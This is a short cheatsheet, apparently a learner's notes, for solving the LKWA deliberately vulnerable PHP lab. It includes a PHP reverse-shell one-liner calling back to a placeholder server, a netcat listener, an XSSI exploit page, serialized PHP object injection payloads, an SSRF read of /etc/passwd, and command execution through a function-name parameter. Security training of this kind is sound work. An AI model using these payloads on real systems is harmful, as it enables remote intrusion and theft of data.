# lkwa-cheatsheet

- my environment: macOS Catalina 10.15.6

Thanks [LKWA](https://github.com/weev3/LKWA).

## 0x01 – Blind RCE

try `sleep 5`

### Reverse Shell

- in my macOS Terminal
  - `nc -l your.server.ip.address 8888`
- in the Browser(text box)
  - `php -r '$sock=fsockopen("your.server.ip.address",8888);exec("/bin/bash -i <&3 >&3 2>&3");'`

## 0x02 – XSSI

you will find `api/user` in response body.  
try `curl http://localhost:3000/api/user`

### deploy tiny hacking server

```bash
mkdir xssi-server
cd xssi-server/
vi index.html
```

```html
<html>
  <head>
    <title>XSSI</title>
  </head>
  <body>
    <script>
      function a(s)
      {
        alert(JSON.stringify(s));
      }
    </script>
    <script src="http://localhost:3000/api/user"></script>
  </body>
</html>
```

deploy: `python3 -m http.server 3001`

access `http://localhost:3001/index.html` from browser.

<img src="https://github.com/fujiokayu/lkwa-cheatsheet/blob/master/evidence/0x02.png" width="200">

## 0x03 – PHP Object Injection

skip.  
I coudn't upload a shell.

## 0x04 – PHP Object Injection(cookie)

change cookie and inject php object as follow:  
O%3A3%3A%22Foo%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%0D%0A

## 0x05 – PHP Object Injection(Object Reference)

change request parameter input as follow:
O%3A7%3A%22Object1%22%3A2%3A%7Bs%3A5%3A%22guess%22%3BN%3Bs%3A10%3A%22secretCode%22%3BR%3A2%3B%7D%0D%0A

## 0x06 – PHAR Deserialization

## 0x07 – SSRF

current application directory is "/var/www/html".  
so let's try "http://localhost:3000/images/lkwa.png" to understand this api.  
  
this api also gets system files like "/etc/passwd".

## 0x08 – Variables variable

when you click Submit Button, you can see this URL in the address bar.
http://localhost:3000/variables/variable.php?func=var_dump&input=your_input

try to change [var_dumps](https://www.php.net/manual/ja/function.var-dump.php) to [system](https://www.php.net/manual/ja/function.system.php) and input value to system command like "http://localhost:3000/variables/variable.php?func=system&input=ls".
